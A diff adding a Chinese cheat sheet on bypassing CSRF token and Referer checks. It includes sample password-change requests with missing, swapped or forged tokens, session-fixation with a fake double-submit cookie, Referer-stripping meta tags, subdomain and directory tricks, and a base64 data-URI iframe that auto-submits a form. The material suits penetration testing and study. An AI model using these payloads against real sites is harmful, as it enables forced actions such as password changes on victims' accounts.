@@ -1,0 +1,113 @@
+CSRF token防御绕过
+1.删除token参数或发送空token
+合法请求：
+POST /change_password
+POST body:
+new_password=qwerty &csrf_tok=871caef0757a4ac9691aceb9aad8b65b
+
+实施请求：
+POST /change_password
+POST body:
+new_password=qwerty
+
+或者是：
+POST /change_password
+POST body:
+new_password=qwerty&csrf_tok=
+
+2.使用另外一个session的CSRF token
+原请求：
+POST /change_password
+POST body:
+new_password=qwerty &csrf_tok=871caef0757a4ac9691aceb9aad8b65b
+
+改为自己的token
+POST /change_password
+POST body:
+new_password=qwerty &csrf_tok=YOUR_TOKEN
+
+3.SESSION固定
+有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。
+如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。
+这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。
+
+
+
+session固定。这是一个可以让你控制受害者的cookie存储的攻击；
+执行如下请求来实施CSRF攻击
+
+POST /change_password
+Cookie: CSRF_TOK=FAKE_TOKEN;
+POST body:
+new_password=qwerty &csrf_tok=FAKE_TOKEN
+
+
+Referer字段的CSRF防御
+如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？
+
+移除referer字段
+和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。
+<meta name =“referrer”content =“no-referrer”>
+应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。
+
+绕过正则表达式
+如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。
+如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com"或”attakcer.com/bank.com"可能可以绕过这种检测。
+
+1.Refere为空条件下
+
+解决方案:
+
+    利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。
+
+    例:
+
+    利用data:协议
+
+<html>
+    <body>
+       <iframe src="data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==">
+    </body> 
+</html>
+ 
+
+    bese64编码 解码即可看到代码
+
+ 
+
+  利用https协议
+
+  https向http跳转的时候Referer为空
+
+  拿一个https的webshell
+
+  <iframe src="https://xxxxx.xxxxx/attack.php">
+
+ attack.php写上CSRF攻击代码
+
+ 
+
+2.判断Referer是某域情况下绕过
+
+ 比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  可以找个二级域名 之后<img "csrf地址">  之后在把文章地址发出去 就可以伪造。
+
+ 
+
+3.判断Referer是否存在某关键词
+
+  referer判断存在不存在google.com这个关键词
+
+  在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过
+
+ 
+
+4.判断referer是否有某域名
+
+   
+
+ 判断了Referer开头是否以126.com以及126子域名  不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。
+
+
+参考链接：
+https://xz.aliyun.com/t/6176
+https://blog.csdn.net/qq_17204441/article/details/91863411
